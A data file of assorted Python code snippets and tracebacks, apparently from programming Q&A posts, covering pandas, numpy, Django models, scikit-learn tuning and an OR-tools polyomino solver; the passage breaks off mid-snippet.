"status=200 protocol=http region_name=Podolsk datetime=2016-03-10 15:51:58 user_ip=0.120.81.243 user_agent=Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ) AppleWebKit/537.36 ( KHTML , like Gecko ) Chrome/48.0.2564.116 Safari/537.36 user_id=7885299833141807155 user_vhost=tindex.ru method=GET page=/search/ Data = pd.read_table ( 'data/data.tsv ' , sep='\t+ ' , header=None , names= [ 'status ' , 'protocol ' , \ 'region_name ' , 'datetime ' , \ 'user_ip ' , 'user_agent ' , \ 'user_id ' , 'user_vhost ' , \ 'method ' , 'page ' ] , engine='python ' ) Clean_Data = ( Data.dropna ( ) ) .reset_index ( drop=True ) ids = Clean_Data.index.tolist ( ) for column in Clean_Data.columns : for row , i in zip ( Clean_Data [ column ] , ids ) : if np.logical_not ( str ( column ) in row ) : Clean_Data.drop ( [ i ] , inplace=True ) ids.remove ( i ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -TypeError Traceback ( most recent call last ) < ipython-input-4-52c9d76f9744 > in < module > ( ) 8 df.index.names = [ 'index ' , 'num ' ] 9 -- - > 10 df = df.set_index ( 'field ' , append=True ) 11 df.index = df.index.droplevel ( level='num ' ) 12 df = df [ 'value ' ] .unstack ( level=1 ) /Users/Peter/anaconda/lib/python2.7/site-packages/pandas/core/frame.pyc in set_index ( self , keys , drop , append , inplace , verify_integrity ) 2805 if isinstance ( self.index , MultiIndex ) : 2806 for i in range ( self.index.nlevels ) : - > 2807 arrays.append ( self.index.get_level_values ( i ) ) 2808 else : 2809 arrays.append ( self.index ) /Users/Peter/anaconda/lib/python2.7/site-packages/pandas/indexes/multi.pyc in get_level_values ( self , level ) 664 values = _simple_new ( filled , self.names [ num ] , 665 freq=getattr ( unique , 'freq ' , None ) , -- > 666 tz=getattr ( unique , 'tz ' , None ) ) 667 return values 668 /Users/Peter/anaconda/lib/python2.7/site-packages/pandas/indexes/range.pyc in _simple_new ( cls , start , stop , step , name , dtype , **kwargs ) 124 return RangeIndex ( start , stop , step , name=name , **kwargs ) 125 except TypeError : -- > 126 return Index ( start , stop , step , name=name , **kwargs ) 127 128 result._start = start/Users/Peter/anaconda/lib/python2.7/site-packages/pandas/indexes/base.pyc in __new__ ( cls , data , dtype , copy , name , fastpath , tupleize_cols , **kwargs ) 212 if issubclass ( data.dtype.type , np.integer ) : 213 from .numeric import Int64Index -- > 214 return Int64Index ( data , copy=copy , dtype=dtype , name=name ) 215 elif issubclass ( data.dtype.type , np.floating ) : 216 from .numeric import Float64Index/Users/Peter/anaconda/lib/python2.7/site-packages/pandas/indexes/numeric.pyc in __new__ ( cls , data , dtype , copy , name , fastpath , **kwargs ) 105 # with a platform int 106 if ( dtype is None or -- > 107 not issubclass ( np.dtype ( dtype ) .type , np.integer ) ) : 108 dtype = np.int64 109 TypeError : data type `` index '' not understood"
variable = read_file ( ) if read_file ( ) else `` File was empty ''
foo/bar/baz { 'foo ' : { 'bar ' : { 'baz ' : 1 } } }
"' I hate *some* kinds of duplicate . This string has a duplicate phrase , duplicate phrase . '"
"from apiclient.discovery import buildimport pprintimport sysapi_key='xxxxxxx'service = build ( 'customsearch ' , 'v1 ' , developerKey=api_key ) request=service.cse ( ) query=request.list ( cx='xxxx : xxxxx ' , q='dogs and cats ' , searchType='image ' , imgType='photo ' ) result=query.execute ( ) pprint.pprint ( result ) for i in result.get ( 'items ' , [ ] ) : print ( i [ 'link ' ] ) https : //s.yimg.com/ny/api/res/1.2/tarWzt2ZXfPOEg8oQVlOWw -- /YXBwaWQ9aGlnaGxhbmRlcjtzbT0xO3c9ODAw/http : //media.zenfs.com/en-US/homerun/people_218/4d82a5fa19dd37247717704975fdf602https : //www.google.com/about/main/machine-learning-qa/img/cat-dog-flow-horizontal.gifhttps : //www.google.com/trends/2014/static/images/pets-snapshot-reveal-1920.jpghttps : //www.google.com/trends/2014/static/images/pets-share.pnghttps : //www.google.com/about/main/machine-learning-qa/img/cat-dog-flow-vertical.gifhttps : //s.yimg.com/uu/api/res/1.2/YQWuQgTnzQuwXjYzX.QrWg -- ~B/aD0xMzMzO3c9MjAwMDtzbT0xO2FwcGlkPXl0YWNoeW9u/http : //media.zenfs.com/en-US/homerun/people_218/4d82a5fa19dd37247717704975fdf602https : //www.google.com/trends/2014/static/images/pets-video-1080.jpghttps : //www.google.com/trends/2014/static/images/pets-video-320.jpghttps : //www.google.com/maps/d/thumbnail ? mid=1hO0YkGLATyy-ZI9JxX1lbv-wK1M & hl=en_US"
"import numpy as np myarray = np.array ( [ [ 1,2,3,4,5 ] , [ 1,2,3,4,5 ] , [ 1,2,3,4,5 ] ] ) myarray [ myarray > = 2 and myarray < 5 ] = 100 Traceback ( most recent call last ) : File `` < input > '' , line 1 , in < module > ValueError : The truth value of an array with more than one element is ambiguous . Use a.any ( ) or a.all ( )"
"def __add__ ( self , other ) : if __typeof__ ( other ) == 'number ' : # Translates to : if ( typeof other == 'number ' ) { return complex ( self.real + other , self.imag ) else : # Other is complex return complex ( self.real + other.real , self.imag + other.imag ) def __sub__ ( self , other ) : if __typeof__ ( other , 'number ' ) : return complex ( self.real - other , self.imag ) else : return complex ( self.real - other.real , self.imag - other.imag ) elif node.func.id == '__typeof__ ' : self.emit ( 'typeof ' ) self.visit ( node.args [ 0 ] ) self.emit ( ' === ' ) # Give JavaScript string interning a chance to avoid char by char comparison self.visit ( node.args [ 1 ] ) return get __add__ ( ) { return __get__ ( this , function ( self , other ) { if ( typeof other === 'number ' ) { return complex ( self.real + other , self.imag ) ; } else { return complex ( self.real + other.real , self.imag + other.imag ) ; } } ) ; } ,"
"proc callbackFunc ( ) : print `` I am in callbackFunc '' cb = callbackFuncTkinter.Tk.call ( 'tclproc : :RetrieveInfo ' , cb ) proc tclproc : :RetrieveInfo ( ) { callback } { eval $ callback }"
@ foo @ bardef baz ( ) : pass def baz ( ) : passbaz = foo ( bar ( baz ) ) )
col_a0 8.41 11.32 7.23 6.54 4.55 8.9 col_a col_b0 8.4 01 11.3 02 7.2 23 6.5 34 4.5 35 8.9 0
"X = df [ my_features_all ] y = df [ 'gold_standard ' ] x_train , x_test , y_train , y_test = train_test_split ( X , y , random_state=0 ) k_fold = StratifiedKFold ( n_splits=5 , shuffle=True , random_state=0 ) clf = RandomForestClassifier ( random_state = 42 , class_weight= '' balanced '' ) rfecv = RFECV ( estimator=clf , step=1 , cv=k_fold , scoring='roc_auc ' ) param_grid = { 'estimator__n_estimators ' : [ 200 , 500 ] , 'estimator__max_features ' : [ 'auto ' , 'sqrt ' , 'log2 ' ] , 'estimator__max_depth ' : [ 3,4,5 ] } CV_rfc = GridSearchCV ( estimator=rfecv , param_grid=param_grid , cv= k_fold , scoring = 'roc_auc ' , verbose=10 , n_jobs = 5 ) CV_rfc.fit ( x_train , y_train ) print ( `` Finished feature selection and parameter tuning '' ) # feature selection resultsprint ( `` Optimal number of features : % d '' % rfecv.n_features_ ) features=list ( X.columns [ rfecv.support_ ] ) print ( features )"
"import numpy as npimport subprocessdef logmem ( ) : subprocess.call ( 'cat /proc/meminfo | grep MemFree ' , shell=True ) def fn ( x ) : return np.int16 ( x*x ) def test_plain ( v ) : print `` Explicit looping : '' logmem ( ) r=np.zeros ( v.shape , dtype=np.int16 ) for z in xrange ( v.shape [ 0 ] ) : for y in xrange ( v.shape [ 1 ] ) : for x in xrange ( v.shape [ 2 ] ) : r [ z , y , x ] =fn ( x ) print type ( r [ 0,0,0 ] ) logmem ( ) return rvecfn=np.vectorize ( fn , otypes= [ np.int16 ] ) def test_vectorize ( v ) : print `` Vectorize : '' logmem ( ) r=vecfn ( v ) print type ( r [ 0,0,0 ] ) logmem ( ) return rlogmem ( ) s= ( 512,512,512 ) v=np.ones ( s , dtype=np.int16 ) logmem ( ) test_plain ( v ) test_vectorize ( v ) v=Nonelogmem ( )"
python setup.py sdist -- formats=zip
"a = [ [ 2,3 ] , [ 1,2,3 ] , [ 1 ] ] b = [ [ 2,3,0 ] , [ 1,2,3 ] , [ 1,0,0 ] ] import pandas as pdb = [ [ 2,3,0 ] , [ 1,2,3 ] , [ 1,0,0 ] ] f=pd.DataFrame ( { 'column ' : b } )"
class SystemInterface ( Interface ) : assigned_to = models.ManyToManyField ( User ) first_system = models.ForeignKey ( System ) second_system = models.ForeignKey ( System )
"`` `` .join ( `` as fa sdf sdfsdf `` .split ( ) ) `` as fa sdf sdfsdf `` .replace ( `` `` , `` '' )"
"L1 = [ ( ' A ' , 1 ) , ( ' B ' , 3 ) , ( ' C ' , 7 ) ] L2 = [ ' A ' , ' b ' , ' C ' ] def match ( item1 , item2 ) : if item1 [ 0 ] == item2 : return 1.0 elif item1 [ 0 ] .lower ( ) == item2.lower ( ) : return 0.5 else : return 0.0 d = Differ ( match_func=match ) d.compare ( L1 , L2 )"
"a = np.array ( ( [ 1,2,3,4,5,6,7,8,9 ] , [ 4,5,6,7,8,9,10,11,12 ] , [ 3,4,5,6,7,8,9,10,11 ] ) ) row , col = a.shapenew_arr = np.ndarray ( a.shape ) for x in xrange ( row ) : for y in xrange ( col ) : min_x = max ( 0 , x-1 ) min_y = max ( 0 , y-1 ) new_arr [ x ] [ y ] = a [ min_x : ( x+2 ) , min_y : ( y+2 ) ] .mean ( ) print new_arr"
"test = np.arange ( 16 ) .reshape ( ( 4 , 4 ) ) testarray ( [ [ 0 , 1 , 2 , 3 ] , [ 4 , 5 , 6 , 7 ] , [ 8 , 9 , 10 , 11 ] , [ 12 , 13 , 14 , 15 ] ] ) array ( [ [ True , True , True , True ] , [ True , False , False , True ] , [ True , False , False , True ] , [ True , True , True , True ] ] ) array ( [ [ [ True , True , True , True , True , True ] , [ True , True , True , True , True , True ] , [ True , True , True , True , True , True ] , [ True , True , True , True , True , True ] , [ True , True , True , True , True , True ] ] , [ [ True , True , True , True , True , True ] , [ True , False , False , False , False , True ] , [ True , False , False , False , False , True ] , [ True , False , False , False , False , True ] , [ True , True , True , True , True , True ] ] , [ [ True , True , True , True , True , True ] , [ True , False , False , False , False , True ] , [ True , False , False , False , False , True ] , [ True , False , False , False , False , True ] , [ True , True , True , True , True , True ] ] , [ [ True , True , True , True , True , True ] , [ True , True , True , True , True , True ] , [ True , True , True , True , True , True ] , [ True , True , True , True , True , True ] , [ True , True , True , True , True , True ] ] ] , dtype=bool )"
"from mpl_toolkits.mplot3d import Axes3Dimport matplotlib.pyplot as pltimport numpy as npkets = [ `` |00 > '' , '' |01 > '' , '' |10 > '' , '' |11 > '' ] # my axis labelsfig = plt.figure ( ) ax1 = fig.add_subplot ( 111 , projection = '3d ' ) xpos = [ 0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3 ] xpos = [ i+0.25 for i in xpos ] ypos = [ 0,1,2,3,0,1,2,3,0,1,2,3,0,1,2,3 ] ypos = [ i+0.25 for i in ypos ] zpos = [ 0 ] *16dx = 0.5*np.ones ( 16 ) dy = 0.5*np.ones ( 16 ) dz = [ 1,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0 ] dz2 = [ 0.2*i for i in dz ] # to superimpose dzticksx = np.arange ( 0.5,4,1 ) ticksy = np.arange ( 0.6,4,1 ) ax1.bar3d ( xpos , ypos , zpos , dx , dy , dz , color = ' # ff0080 ' , alpha = 0.5 ) ax1.w_xaxis.set_ticklabels ( kets ) ax1.w_yaxis.set_ticklabels ( kets ) ax1.set_zlabel ( 'Coefficient ' ) plt.xticks ( ticksx , kets ) plt.yticks ( ticksy , kets ) plt.show ( )"
"x = data [ : ,0 ] y = data [ : ,1 ]"
"|=============================================================|| QueriedValue | CalculatedValue | User_data | More_User_data ||_____________________________________________________________|| Foo 1 | Bar 1 | | || Foo 2 | Bar 2 | | || Foo 3 | Bar 3 | | | ... ... ... ... || Foo n | Bar n | | ||=============================================================| ++++++++++ | Submit | ++++++++++ TimeStamp + fk_Foo = natural primary key for this table ________________ / \|===========================================================|| TimeStamp | fk_Foo | User_data | More_User_data ||___________________________________________________________|| submit_time | Foo 1 | Datum 1 | AnotherDatum 1 || submit_time | Foo 2 | Datum 2 | AnotherDatum 2 || submit_time | Foo 3 | Datum 3 | AnotherDatum 3 || ... ... ... ... || submit_time | Foo n | Datum n | AnotherDatum n ||===========================================================| # models.pyclass GasFarm ( models.Model ) : `` '' '' Represents a gas farm -- a collection of lines that are grouped together and managed as a unit. `` '' '' name = models.CharField ( max_length=30 , unique=True ) def __unicode__ ( self ) : return self.nameclass Bottle ( models.Model ) : `` '' '' Represents a gas bottle -- the physical cylinder -- that contains a mixture of gases. `` '' '' # Options get_latest_by = 'date_added ' # Fields BACKGROUND_TYPES = ( ( 'h2/n2 ' , `` H2/N2 '' ) , ( 'h2/air ' , `` H2/Air '' ) , ( 'h2 ' , `` H2 '' ) , ( 'n2 ' , `` N2 '' ) , ( 'other ' , `` Other '' ) , ) ppm = models.FloatField ( ) mix = models.CharField ( max_length=50 , choices=BACKGROUND_TYPES , default='n2 ' ) ref = models.CharField ( max_length=50 , unique=True ) # Every bottle has a unique ref or somebody fucked up . cert_date = models.DateTimeField ( ) date_added = models.DateTimeField ( default=timezone.now ( ) ) def pct ( self ) : return float ( self.ppm ) /10**4 def __unicode__ ( self ) : return `` { } ( { } % { } ) '' .format ( self.ref , self.pct ( ) , self.mix , ) class Line ( models.Model ) : `` '' '' Represents a gas line -- the physical plumbing -- that delivers gas from the bottles to the test stations . It is assumed that a gas line can have zero or one gas bottles attached to it at any given time . The Line model maps bottle objects and time-sensitive Reading objects to test stations. `` '' '' # Fields gasfarm = models.ForeignKey ( GasFarm ) number = models.CharField ( max_length=10 , unique=True ) bottles = models.ManyToManyField ( Bottle , through='Reading ' ) # Calculated fields . `` current '' is definitely not optional -- that 's a super common query . The others ? I 'm not so # sure ... def current ( self ) : `` '' '' Returns the most recently recorded Reading object associated with the line `` '' '' return self.reading_set.latest ( field_name='time ' ) current.short_description = `` latest reading '' def last_checked ( self ) : `` '' '' Returns the date & time at which the most recent Reading object associated with this line was logged `` '' '' return self.current ( ) .time last_checked.short_description = `` last updated '' def has_recent_reading ( self ) : `` '' '' Boolean flag for whether the reading is probably valid , or if someone needs to go out and take a new one. `` '' '' latest_reading = self.current ( ) .time return timezone.now ( ) - latest_reading < datetime.timedelta ( days=3 ) has_recent_reading.boolean = True has_recent_reading.short_description = `` Is data current ? '' def __unicode__ ( self ) : return self.numberclass Reading ( models.Model ) : `` '' '' A Reading links a Bottle to a Line at a given time , and provides a snapshot of the pressure at that time. `` '' '' # Options get_latest_by = 'time ' # Fields line = models.ForeignKey ( Line ) bottle = models.ForeignKey ( Bottle ) time = models.DateTimeField ( ) psi = models.IntegerField ( validators= [ MaxValueValidator ( 2500 ) ] ) def ref ( self ) : `` '' '' The reference number of the bottle listed in the reading `` '' '' return self.bottle.ref def ppm ( self ) : `` '' '' The PPM concentration of the bottle listed in the reading `` '' '' return self.bottle.ppm def pct ( self ) : `` '' '' The % concentration of the bottle listed in the reading `` '' '' return self.bottle.pct ( ) def mix ( self ) : `` '' '' The gas mix ( e.g . H2/N2 ) of the associated bottle `` '' '' return self.bottle.mix def __unicode__ ( self ) : # Example : # A0 : 327.3 PPM H2/N2 2300 psi return `` { } , { } : { } PPM { } { } psi '' .format ( self.line , self.time , self.ppm ( ) , self.mix ( ) , self.psi ) # Cells with brackets [ ] are system-supplied , non-editable data displayed in the table . # Cells without brackets are pre-filled with sensible defaults , but are user editable.| [ Line ] | [ Current Bottle ] | Reading Time | Pressure ( psi ) |===============================================================| [ A0 ] | [ 15-1478334 ] | 2014-7-14 9:34 | 2400 || [ A1 ] | [ 15-1458661 ] | 2014-7-14 9:34 | 500 || [ A2 ] | [ 15-4851148 ] | 2014-7-14 9:34 | 1850 || [ A3 ] | [ 15-1365195 ] | 2014-7-14 9:34 | 700 | ... ... | [ C18 ] | [ 15-9555813 ] | 2014-7-14 9:34 | 2350 ||=====================================================================| # Forms.py class PressureReadingUpdate ( forms.ModelForm ) : class Meta : model = models.ReadingPsiReadingFormset = formset_factory ( PressureReadingUpdate , extra=0 ) # views.pydef update_pressure ( request ) : if request.method == 'POST ' : formset = forms.PsiReadingFormset ( request.POST ) if formset.is_valid ( ) : cd = formset.cleaned_data # do something ? I 'm not here yet ... else : lines = models.Line.objects.all ( ) now = datetime.datetime.now ( ) initial = [ { 'line ' : l , 'psi ' : l.current ( ) .psi , `` bottle '' : l.current ( ) .bottle , 'time ' : now } for l in lines ] formset = forms.PsiReadingFormset ( initial=initial , ) return render ( request , 'gas_tracking/gasfarm_form_psi_reading.html ' , { 'formset ' : formset } )"
"df_projetos_api_final.info ( ) < class 'pandas.core.frame.DataFrame ' > Int64Index : 93631 entries , 1 to 93667 Data columns ( total 21 columns ) : AnoMateria 93631 non-null object CodigoMateria 93631 non-null object DescricaoIdentificacaoMateria 93631 non-null object DescricaoSubtipoMateria 93631 non-null object IndicadorTramitando 93631 non-null object NomeCasaIdentificacaoMateria 93631 non-null object NumeroMateria 93631 non-null object ApelidoMateria 891 non-null object DataApresentacao 93631 non-null object DataLeitura 54213 non-null object EmentaMateria 93631 non-null object ExplicacaoEmentaMateria 9461 non-null object IndicadorComplementar 93631 non-null object DescricaoNatureza 54352 non-null object NomeAutor 93100 non-null object IndicadorOutrosAutores 93214 non-null object CodigoParlamentar 49786 non-null object NomeParlamentar 49786 non-null object NomeCompletoParlamentar 49786 non-null object UfParlamentar 45613 non-null object DescricaoSituacao 78783 non-null object dtypes : object ( 21 ) memory usage : 8.2+ MB str_choice = `` MULHER|MULHERES|TRABALHO DOMESTICO|VIOLENCIA CONTRA A MULHER|VIOLENCIA DOMESTICA|VIOLENCIA DE GENERO|MARIA DA PENHA|ABORTO|ABORTAMENTO|INTERRUPCAO DE GRAVIDEZ|INTERRUPCAO DE GESTACAO|DIREITO REPRODUTIVO|DIREITOS REPRODUTIVOS|DIREITO A VIDA|CONCEPCAO|CONTRACEPCAO|CONTRACEPTIVO|MISOPROSTOL|MIFEPRISTONE|CYTOTEC|UTERO|GESTACAO|GRAVIDEZ|PARTO|VIOLENCIA OBSTETRICA|FETO|BEBE|CRIANCA|VIOLENCIA SEXUAL|FEMINICIDIO|MORTE DE MULHER|MORTE DE MULHERES|HOMICIDIO DE MULHER|HOMICIDIO DE MULHERES|ASSEDIO SEXUAL|ASSEDIO|ESTUPRO|VIOLENCIA SEXUAL|ABUSO SEXUAL|ESTUPRO DE VULNERAVEL|LICENCA MATERNIDADE|FEMININO|MULHER NEGRA|MULHERES NEGRAS|MULHERES QUILOMBOLAS|MULHERES INDIGENAS|NEGRAS|NEGRA|RACISMO|RACA|RACIAL|ABUSO SEXUAL|MATERNIDADE|MAE|AMAMENTACAO|SEXUALIDADE|SEXO|GENERO|FEMINISMO|MACHISMO|GUARDA DE FILHOS|GUARDA DOS FILHOS|IGUALDADE DE GENERO|IDENTIDADE DE GENERO|IDEOLOGIA DE GENERO|EDUCACAO SEXUAL|ESCOLA SEM PARTIDO|TRANSEXUAL|TRANSEXUALIDADE|MULHER TRANS|MULHERES TRANS|MUDANCA DE SEXO|READEQUACAO SEXUAL|EXPLORACAO SEXUAL|PROSTITUICAO|ORIENTACAO SEXUAL|HOMOSSEXUAL|HOMOSSEXUALIDADE|HOMOSSEXUALISMO|LESBICA|LESBICAS|DIREITO DOS HOMENS|EDUCACAO RELIGIOSA|DEUS|RELIGIAO|EDUCACAO DOMICILIAR|HOMESCHOOLING|CRECHE|EDUCACAO INFANTIL|CASAMENTO INFANTIL '' seleciona2 = df_projetos_api_final [ df_projetos_api_final [ 'EmentaMateria ' ] .\ str.contains ( str_choice , na=False ) ] df_projetos_api_final [ 'EmentaMateria ' ] = df_projetos_api_final [ 'EmentaMateria ' ] .str.upper ( ) search_list = [ `` MULHER '' , `` MULHERES '' , `` TRABALHO DOMÉSTICO '' , `` VIOLÊNCIA CONTRA A MULHER '' , `` VIOLÊNCIA DOMÉSTICA '' , `` VIOLÊNCIA DE GÊNERO '' , `` MARIA DA PENHA '' , `` ABORTO '' , `` ABORTAMENTO '' , `` INTERRUPÇÃO DE GRAVIDEZ '' , `` INTERRUPÇÃO DE GESTAÇÃO '' , `` DIREITO REPRODUTIVO '' , `` DIREITOS REPRODUTIVOS '' , `` DIREITO À VIDA '' , `` CONCEPÇÃO '' , `` CONTRACEPÇÃO '' , `` CONTRACEPTIVO '' , `` MISOPROSTOL '' , `` MIFEPRISTONE '' , `` CYTOTEC '' , `` ÚTERO '' , `` GESTAÇÃO '' , `` GRAVIDEZ '' , `` PARTO '' , `` VIOLÊNCIA OBSTÉTRICA '' , `` FETO '' , `` BEBÊ '' , `` CRIANÇA '' , `` VIOLÊNCIA SEXUAL '' , `` FEMINICÍDIO '' , `` MORTE DE MULHER '' , `` MORTE DE MULHERES '' , `` HOMICÍDIO DE MULHER '' , `` HOMICÍDIO DE MULHERES '' , `` ASSÉDIO SEXUAL '' , `` ASSÉDIO '' , `` ESTUPRO '' , `` VIOLÊNCIA SEXUAL '' , `` ABUSO SEXUAL '' , `` ESTUPRO DE VULNERÁVEL '' , `` LICENÇA MATERNIDADE '' , `` FEMININO '' , `` MULHER NEGRA '' , `` MULHERES NEGRAS '' , `` MULHERES QUILOMBOLAS '' , `` MULHERES INDÍGENAS '' , `` NEGRAS '' , `` NEGRA '' , `` RACISMO '' , `` RAÇA '' , `` RACIAL '' , `` ABUSO SEXUAL '' , `` MATERNIDADE '' , `` MÃE '' , `` AMAMENTAÇÃO '' , `` SEXUALIDADE '' , `` SEXO '' , `` GÊNERO '' , `` FEMINISMO '' , `` MACHISMO '' , `` GUARDA DE FILHOS '' , `` GUARDA DOS FILHOS '' , `` IGUALDADE DE GÊNERO '' , `` IDENTIDADE DE GÊNERO '' , `` IDEOLOGIA DE GÊNERO '' , `` EDUCAÇÃO SEXUAL '' , `` ESCOLA SEM PARTIDO '' , `` TRANSEXUAL '' , `` TRANSEXUALIDADE '' , `` MULHER TRANS '' , `` MULHERES TRANS '' , `` MUDANÇA DE SEXO '' , `` READEQUAÇÃO SEXUAL '' , `` EXPLORAÇÃO SEXUAL '' , `` PROSTITUIÇÃO '' , `` ORIENTAÇÃO SEXUAL '' , `` HOMOSSEXUAL '' , `` HOMOSSEXUALIDADE '' , `` HOMOSSEXUALISMO '' , `` LÉSBICA '' , `` LÉSBICAS '' , `` DIREITO DOS HOMENS '' , `` EDUCAÇÃO RELIGIOSA '' , `` DEUS '' , `` RELIGIÃO '' , `` EDUCACÃO DOMICILIAR '' , `` HOMESCHOOLING '' , `` CRECHE '' , `` EDUCAÇÃO INFANTIL '' , `` CASAMENTO INFANTIL '' ] mask = df_projetos_api_final [ 'EmentaMateria ' ] .str.contains ( '|'.join ( search_list ) ) seleciona = df_projetos_api_final [ mask ] seleciona.info ( )"
"import sysfrom collections import Counterstring = sys.stdin.readline ( ) .strip ( ) d = dict ( Counter ( string ) .most_common ( 3 ) ) d = sorted ( d.items ( ) , key=lambda x : ( -x [ 1 ] , x [ 0 ] ) , reverse=False ) for letter , count in d [ :3 ] : print letter , count"
"import sysimport timeitdef foo ( ) : setup = `` '' '' import random `` '' '' foo_1 = `` '' '' for i in range ( 1000 ) : random.randint ( 0 , 99 ) + random.randint ( 0 , 99 ) `` '' '' foo_2 = `` '' '' for i in range ( 1000 ) : random.randint ( 0 , 99 ) + random.randint ( 0 , 99 ) `` '' '' foo_3 = `` '' '' for i in range ( 1000 ) : random.randint ( 0 , 99 ) + random.randint ( 0 , 99 ) `` '' '' print 'foo_1 ' , timeit.Timer ( foo_1 , setup ) .timeit ( 1000 ) print 'foo_2 ' , timeit.Timer ( foo_2 , setup ) .timeit ( 1000 ) print 'foo_3 ' , timeit.Timer ( foo_3 , setup ) .timeit ( 1000 ) if __name__ == '__main__ ' : if ( len ( sys.argv ) > 1 ) : if ( sys.argv [ 1 ] == 'foo ' ) : foo ( ) else : print 'Which profiling do you want to run ? ' print 'available : ' print ' foo ' foo_1Traceback ( most recent call last ) : File `` profiling.py '' , line 32 , in < module > foo ( ) File `` profiling.py '' , line 25 , in foo print 'foo_1 ' , timeit.Timer ( foo_1 , setup ) .timeit ( 1000 ) File `` /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/timeit.py '' , line 136 , in __init__ code = compile ( src , dummy_src_name , `` exec '' ) File `` < timeit-src > '' , line 6 _t0 = _timer ( ) ^IndentationError : unindent does not match any outer indentation level"
"model = RandomForestClassifier ( 500 , n_jobs = -1 ) ; model.fit ( X_train , y_train ) ; probas = model.predict_proba ( X_test ) [ : , 1 ] precision , recall , thresholds = precision_recall_curve ( y_test , probas ) print len ( precision ) print len ( thresholds ) 283 282"
"food2 = { } food2 [ `` apple '' ] = [ `` fruit '' , `` round '' ] food2 [ `` bananna '' ] = [ `` fruit '' , `` yellow '' , `` long '' ] food2 [ `` carrot '' ] = [ `` veg '' , `` orange '' , `` long '' ] food2 [ `` raddish '' ] = [ `` veg '' , `` red '' ] + -- -- -- -- -+ -- -- -- -+ -- -- -+ -- -- -- -+ -- -- -- + -- -- -- -- + -- -- -- -- + -- -- -+| | fruit | veg | round | long | yellow | orange | red |+ -- -- -- -- -+ -- -- -- -+ -- -- -+ -- -- -- -+ -- -- -- + -- -- -- -- + -- -- -- -- + -- -- -+| apple | 1 | | 1 | | | | |+ -- -- -- -- -+ -- -- -- -+ -- -- -+ -- -- -- -+ -- -- -- + -- -- -- -- + -- -- -- -- + -- -- -+| bananna | 1 | | | 1 | 1 | | |+ -- -- -- -- -+ -- -- -- -+ -- -- -+ -- -- -- -+ -- -- -- + -- -- -- -- + -- -- -- -- + -- -- -+| carrot | | 1 | | 1 | | 1 | |+ -- -- -- -- -+ -- -- -- -+ -- -- -+ -- -- -- -+ -- -- -- + -- -- -- -- + -- -- -- -- + -- -- -+| raddish | | 1 | | | | | 1 |+ -- -- -- -- -+ -- -- -- -+ -- -- -+ -- -- -- -+ -- -- -- + -- -- -- -- + -- -- -- -- + -- -- -+ for key in food2 : attrlist = food2 [ key ] onefruit_pairs = map ( lambda x : [ key , x ] , attrlist ) one_fruit_frame = pd.DataFrame ( onefruit_pairs , columns= [ 'fruit ' , 'attr ' ] ) print ( one_fruit_frame ) fruit attr0 bananna fruit1 bananna yellow2 bananna long fruit attr0 carrot veg1 carrot orange2 carrot long fruit attr0 apple fruit1 apple round fruit attr0 raddish veg1 raddish red"
"from ortools.sat.python import cp_modelimport numpy as npimport more_itertools as mitimport matplotlib.pyplot as plt % matplotlib inlineW , H = 4 , 4 # Dimensions of gridsizes = ( 4 , 2 , 5 , 2 , 1 ) # Size of each polyominolabels = np.arange ( len ( sizes ) ) # Label of each polyominocolors = ( ' # FA5454 ' , ' # 21D3B6 ' , ' # 3384FA ' , ' # FFD256 ' , ' # 62ECFA ' ) cdict = dict ( zip ( labels , colors ) ) # Color dictionary for plottinginactiveCells = ( 0 , 1 ) # Indices of disabled cells ( in 1D ) activeCells = set ( np.arange ( W*H ) ) .difference ( inactiveCells ) # Cells where polyominoes can be fittedranges = [ ( next ( g ) , list ( g ) [ -1 ] ) for g in mit.consecutive_groups ( activeCells ) ] # All intervals in the stack of active cellsdef main ( ) : model = cp_model.CpModel ( ) # Create an Int var for each cell of each polyomino constrained to be within Width and Height of grid . pminos = [ [ ] for s in sizes ] for idx , s in enumerate ( sizes ) : for i in range ( s ) : pminos [ idx ] .append ( [ model.NewIntVar ( 0 , W-1 , ' p % i ' % idx + ' c % i ' % i + ' x ' ) , model.NewIntVar ( 0 , H-1 , ' p % i ' % idx + ' c % i ' % i + ' y ' ) ] ) # Define the shapes by constraining the cells relative to each other # # 1st polyomino - > tetromino # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # p0 = pminos [ 0 ] model.Add ( p0 [ 1 ] [ 0 ] == p0 [ 0 ] [ 0 ] + 1 ) # ' x ' of 2nd cell == ' x ' of 1st cell + 1 model.Add ( p0 [ 2 ] [ 0 ] == p0 [ 1 ] [ 0 ] + 1 ) # ' x ' of 3rd cell == ' x ' of 2nd cell + 1 model.Add ( p0 [ 3 ] [ 0 ] == p0 [ 0 ] [ 0 ] + 1 ) # ' x ' of 4th cell == ' x ' of 1st cell + 1 model.Add ( p0 [ 1 ] [ 1 ] == p0 [ 0 ] [ 1 ] ) # ' y ' of 2nd cell = ' y ' of 1st cell model.Add ( p0 [ 2 ] [ 1 ] == p0 [ 1 ] [ 1 ] ) # ' y ' of 3rd cell = ' y ' of 2nd cell model.Add ( p0 [ 3 ] [ 1 ] == p0 [ 1 ] [ 1 ] - 1 ) # ' y ' of 3rd cell = ' y ' of 2nd cell - 1 # # 2nd polyomino - > domino # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # p1 = pminos [ 1 ] model.Add ( p1 [ 1 ] [ 0 ] == p1 [ 0 ] [ 0 ] ) model.Add ( p1 [ 1 ] [ 1 ] == p1 [ 0 ] [ 1 ] + 1 ) # # 3rd polyomino - > pentomino # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # p2 = pminos [ 2 ] model.Add ( p2 [ 1 ] [ 0 ] == p2 [ 0 ] [ 0 ] + 1 ) model.Add ( p2 [ 2 ] [ 0 ] == p2 [ 0 ] [ 0 ] ) model.Add ( p2 [ 3 ] [ 0 ] == p2 [ 0 ] [ 0 ] + 1 ) model.Add ( p2 [ 4 ] [ 0 ] == p2 [ 0 ] [ 0 ] ) model.Add ( p2 [ 1 ] [ 1 ] == p2 [ 0 ] [ 1 ] ) model.Add ( p2 [ 2 ] [ 1 ] == p2 [ 0 ] [ 1 ] + 1 ) model.Add ( p2 [ 3 ] [ 1 ] == p2 [ 0 ] 